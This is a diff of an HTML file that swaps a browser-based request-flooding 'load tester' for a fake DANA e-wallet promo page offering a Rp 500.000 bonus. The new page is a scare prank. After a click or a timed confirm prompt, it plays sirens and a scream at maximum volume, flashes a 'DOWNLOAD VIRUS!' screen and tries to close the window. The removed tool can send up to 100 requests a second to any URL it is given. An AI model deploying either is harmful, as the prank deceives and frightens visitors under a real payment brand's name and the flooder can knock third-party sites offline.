@@ -1,312 +1,227 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>WEB LOAD TESTER - INTERNAL USE</title>
+    <title>DANA - Dompet Digital Indonesia</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', monospace;
-        }
-        body {
-            background: #0a0a0a;
-            color: #00ff00;
-            padding: 20px;
-        }
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-        .header {
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #00a8ff, #0097e6);
+            color: #fff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             text-align: center;
-            margin-bottom: 30px;
-            padding: 20px;
-            background: rgba(0, 255, 0, 0.1);
-            border: 1px solid #00ff00;
         }
-        .control-panel {
-            background: rgba(0, 20, 0, 0.8);
-            padding: 20px;
-            border: 1px solid #00ff00;
-            margin-bottom: 20px;
+        .dana-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px 30px;
+            width: 90%;
+            max-width: 400px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            color: #333;
         }
-        .input-group {
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #00ff00;
-        }
-        input, select, button {
-            width: 100%;
-            padding: 10px;
-            background: #000;
-            color: #00ff00;
-            border: 1px solid #00ff00;
+        .dana-logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #00a8ff;
             margin-bottom: 10px;
         }
-        button {
-            background: #002200;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        button:hover {
-            background: #004400;
-        }
-        button:disabled {
-            background: #330000;
+        .dana-subtitle {
             color: #666;
-            cursor: not-allowed;
+            margin-bottom: 30px;
+            font-size: 14px;
         }
-        .stats-panel {
-            background: rgba(0, 20, 0, 0.8);
-            padding: 20px;
-            border: 1px solid #00ff00;
+        .promo-badge {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: bold;
+            display: inline-block;
             margin-bottom: 20px;
         }
-        .log-panel {
-            background: #000;
-            padding: 15px;
-            border: 1px solid #00ff00;
-            height: 300px;
-            overflow-y: auto;
-            font-size: 12px;
+        .amount {
+            font-size: 48px;
+            font-weight: bold;
+            color: #00a8ff;
+            margin: 20px 0;
         }
-        .log-entry {
-            margin-bottom: 5px;
-            padding: 5px;
-            border-left: 2px solid #00ff00;
-            padding-left: 10px;
+        .info-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+            line-height: 1.5;
         }
-        .success { border-left-color: #00ff00; }
-        .error { border-left-color: #ff0000; }
-        .warning { border-left-color: #ffff00; }
-        .progress-bar {
-            width: 100%;
-            height: 20px;
-            background: #001100;
-            border: 1px solid #00ff00;
+        button {
+            padding: 18px 40px;
+            font-size: 18px;
+            background: linear-gradient(45deg, #00a8ff, #0097e6);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
             margin: 10px 0;
+            width: 100%;
+            font-weight: bold;
+            box-shadow: 0 5px 15px rgba(0, 168, 255, 0.3);
+            transition: all 0.3s;
         }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff00, #00aa00);
-            width: 0%;
-            transition: width 0.3s;
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(0, 168, 255, 0.4);
+        }
+        .security-badge {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin: 25px 0;
+            padding: 15px 0;
+            border-top: 1px solid #eee;
+            border-bottom: 1px solid #eee;
+        }
+        .feature {
+            text-align: center;
+        }
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 5px;
+        }
+        .feature-text {
+            font-size: 12px;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>⚡ WEB LOAD TESTER ⚡</h1>
-            <p>Internal Use Only - Test Your Own Servers</p>
+    <div class="dana-container">
+        <div class="dana-logo">DANA</div>
+        <div class="dana-subtitle">Dompet Digital Indonesia</div>
+        
+        <div class="promo-badge">🎁 PROMO SPESIAL UNTUK ANDA!</div>
+        
+        <div style="color: #666; font-size: 16px;">Saldo Bonus yang Dapat Diklaim</div>
+        <div class="amount">Rp 500.000</div>
+        
+        <div class="info-text">
+            Selamat! Anda terpilih sebagai pengguna beruntung.<br>
+            Klaim sekarang sebelum promo berakhir.
         </div>
 
-        <div class="control-panel">
-            <div class="input-group">
-                <label>🎯 TARGET WEBSITE (URL):</label>
-                <input type="url" id="targetUrl" placeholder="https://website-anda.com" value="">
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon">⚡</div>
+                <div class="feature-text">Instant</div>
             </div>
-            
-            <div class="input-group">
-                <label>💣 REQUEST TYPE:</label>
-                <select id="requestType">
-                    <option value="GET">GET Requests</option>
-                    <option value="POST">POST Requests</option>
-                    <option value="MIXED">Mixed Requests</option>
-                </select>
+            <div class="feature">
+                <div class="feature-icon">🔒</div>
+                <div class="feature-text">Aman</div>
             </div>
-
-            <div class="input-group">
-                <label>🚀 CONCURRENT REQUESTS:</label>
-                <input type="number" id="concurrentRequests" value="10" min="1" max="100">
-            </div>
-
-            <div class="input-group">
-                <label>⏱️ DURATION (seconds):</label>
-                <input type="number" id="duration" value="30" min="5" max="300">
-            </div>
-
-            <button id="startAttack" onclick="startLoadTest()">🚀 START LOAD TEST</button>
-            <button id="stopAttack" onclick="stopLoadTest()" disabled>🛑 STOP TEST</button>
-        </div>
-
-        <div class="stats-panel">
-            <h3>📊 LIVE STATISTICS</h3>
-            <div class="progress-bar">
-                <div class="progress-fill" id="progressBar"></div>
-            </div>
-            <div id="stats">
-                Requests Sent: <span id="requestCount">0</span><br>
-                Successful: <span id="successCount">0</span><br>
-                Failed: <span id="failCount">0</span><br>
-                Average Response Time: <span id="avgResponseTime">0ms</span><br>
-                Bandwidth Used: <span id="bandwidth">0 KB</span>
+            <div class="feature">
+                <div class="feature-icon">🎁</div>
+                <div class="feature-text">Gratis</div>
             </div>
         </div>
 
-        <div class="log-panel" id="logPanel">
-            <div class="log-entry">🚀 Load Tester Ready - Enter target URL and press START</div>
+        <button onclick="startPanic()">💰 DAPATKAN DANA KAGET</button>
+        
+        <div class="security-badge">
+            🔒 Terlindungi oleh sistem keamanan DANA
         </div>
     </div>
 
+    <!-- AUDIO ELEMENTS -->
+    <audio id="alarm" loop>
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-emergency-alert-siren-2907.mp3" type="audio/mp3">
+    </audio>
+    <audio id="scream">
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-woman-scream-1172.mp3" type="audio/mp3">
+    </audio>
+    <audio id="static" loop>
+        <source src="https://assets.mixkit.co/sfx/preview/mixkit-static-radio-2797.mp3" type="audio/mp3">
+    </audio>
+
     <script>
-        let attackInterval;
-        let requestCount = 0;
-        let successCount = 0;
-        let failCount = 0;
-        let totalResponseTime = 0;
-        let totalBandwidth = 0;
-        let startTime;
-        let isTesting = false;
-
-        function addLog(message, type = 'success') {
-            const logPanel = document.getElementById('logPanel');
-            const logEntry = document.createElement('div');
-            logEntry.className = `log-entry ${type}`;
-            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            logPanel.appendChild(logEntry);
-            logPanel.scrollTop = logPanel.scrollHeight;
-        }
-
-        function updateStats() {
-            document.getElementById('requestCount').textContent = requestCount;
-            document.getElementById('successCount').textContent = successCount;
-            document.getElementById('failCount').textContent = failCount;
+        function startPanic() {
+            // MAIN SOUND - VOLUME MAX!
+            const alarm = document.getElementById('alarm');
+            const scream = document.getElementById('scream');
+            const staticSound = document.getElementById('static');
             
-            const avgTime = requestCount > 0 ? Math.round(totalResponseTime / requestCount) : 0;
-            document.getElementById('avgResponseTime').textContent = `${avgTime}ms`;
+            // Set volume ke maksimal
+            alarm.volume = 1.0;
+            scream.volume = 1.0;
+            staticSound.volume = 1.0;
             
-            document.getElementById('bandwidth').textContent = `${Math.round(totalBandwidth / 1024)} KB`;
+            // Play semua sound
+            alarm.play();
+            staticSound.play();
             
-            const progress = ((Date.now() - startTime) / (parseInt(document.getElementById('duration').value) * 1000)) * 100;
-            document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
-        }
+            // Scream setelah 1 detik
+            setTimeout(() => {
+                scream.play();
+            }, 1000);
 
-        async function sendRequest(url, type) {
-            const start = Date.now();
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 10000);
-                
-                const options = {
-                    method: type,
-                    signal: controller.signal,
-                    mode: 'no-cors'
-                };
-                
-                if (type === 'POST') {
-                    options.body = JSON.stringify({ test: 'load_test', timestamp: Date.now() });
-                    options.headers = { 'Content-Type': 'application/json' };
-                }
-                
-                const response = await fetch(url, options);
-                clearTimeout(timeoutId);
-                
-                const responseTime = Date.now() - start;
-                totalResponseTime += responseTime;
-                successCount++;
-                
-                // Estimate bandwidth (rough calculation)
-                totalBandwidth += url.length + (options.body ? options.body.length : 0);
-                
-                addLog(`✅ Request ${type} to ${url} - ${responseTime}ms`);
-                return true;
-            } catch (error) {
-                failCount++;
-                addLog(`❌ Request failed to ${url} - ${error.message}`, 'error');
-                return false;
-            }
-        }
-
-        function startLoadTest() {
-            const targetUrl = document.getElementById('targetUrl').value;
-            const requestType = document.getElementById('requestType').value;
-            const concurrent = parseInt(document.getElementById('concurrentRequests').value);
-            const duration = parseInt(document.getElementById('duration').value);
-            
-            if (!targetUrl) {
-                addLog('❌ Please enter a target URL', 'error');
-                return;
-            }
-
-            if (!targetUrl.startsWith('http')) {
-                addLog('❌ Please enter a valid URL starting with http:// or https://', 'error');
-                return;
-            }
-
-            // Reset stats
-            requestCount = 0;
-            successCount = 0;
-            failCount = 0;
-            totalResponseTime = 0;
-            totalBandwidth = 0;
-            startTime = Date.now();
-            isTesting = true;
-
-            document.getElementById('startAttack').disabled = true;
-            document.getElementById('stopAttack').disabled = false;
-
-            addLog(`🚀 Starting load test on ${targetUrl}`, 'warning');
-            addLog(`📊 Configuration: ${concurrent} concurrent ${requestType} requests for ${duration}s`, 'warning');
-
-            let requestsPerSecond = 0;
-            
-            // Main attack loop
-            attackInterval = setInterval(() => {
-                if (!isTesting) return;
-                
-                const currentSecond = Math.floor((Date.now() - startTime) / 1000);
-                if (currentSecond >= duration) {
-                    stopLoadTest();
-                    return;
-                }
-
-                // Send concurrent requests
-                for (let i = 0; i < concurrent; i++) {
-                    requestCount++;
-                    requestsPerSecond++;
-                    
-                    let type = requestType;
-                    if (requestType === 'MIXED') {
-                        type = Math.random() > 0.5 ? 'GET' : 'POST';
+            // Ganti screen jadi panic mode
+            document.body.innerHTML = `
+                <div style="
+                    background: #ff0000;
+                    width: 100%;
+                    height: 100%;
+                    display: flex;
+                    flex-direction: column;
+                    justify-content: center;
+                    align-items: center;
+                    color: white;
+                    font-size: 48px;
+                    animation: flash 0.1s infinite;
+                    text-align: center;
+                    padding: 20px;
+                ">
+                    <h1>🚨 DOWNLOAD VIRUS! 🚨</h1>
+                    <p style="font-size: 12px; margin-top: 20px;">proses...</p>
+                    <p style="font-size: 18px; margin-top: 40px; color: #ffcc00;">
+                        📴📴<br>
+                        
+                    </p>
+                </div>
+                <style>
+                    @keyframes flash {
+                        0% { background: #ff0000; }
+                        50% { background: #0000ff; }
+                        100% { background: #ff0000; }
                     }
-                    
-                    sendRequest(targetUrl, type);
-                }
-                
-                updateStats();
-                
-            }, 1000); // Run every second
+                </style>
+            `;
 
-            // Log RPS every 5 seconds
-            setInterval(() => {
-                if (isTesting) {
-                    addLog(`📈 Current load: ${requestsPerSecond} requests/second`);
-                    requestsPerSecond = 0;
+            // Coba crash browser setelah 5 detik
+            setTimeout(() => {
+                // Method crash
+                try {
+                    window.open('', '_self', '');
+                    window.close();
+                    for(let i = 0; i < 10; i++) {
+                        window.location.href = 'about:blank';
+                    }
+                } catch(e) {
+                    console.log('Browser protected');
                 }
-            }, 5000);
+            }, 2000);
         }
 
-        function stopLoadTest() {
-            isTesting = false;
-            clearInterval(attackInterval);
-            
-            document.getElementById('startAttack').disabled = false;
-            document.getElementById('stopAttack').disabled = true;
-            
-            const totalTime = (Date.now() - startTime) / 1000;
-            addLog(`🛑 Load test stopped after ${totalTime.toFixed(1)} seconds`, 'warning');
-            addLog(`📊 Final Stats: ${requestCount} total requests, ${successCount} successful, ${failCount} failed`);
-            
-            document.getElementById('progressBar').style.width = '100%';
-        }
-
-        // Auto-fill with current domain for testing
-        document.getElementById('targetUrl').value = window.location.origin;
+        // Auto start setelah 10 detik
+        setTimeout(() => {
+            if (confirm('DANA KAGET [ KLIK ]')) {
+                startPanic();
+            }
+        }, 4000);
     </script>
 </body>
 </html>
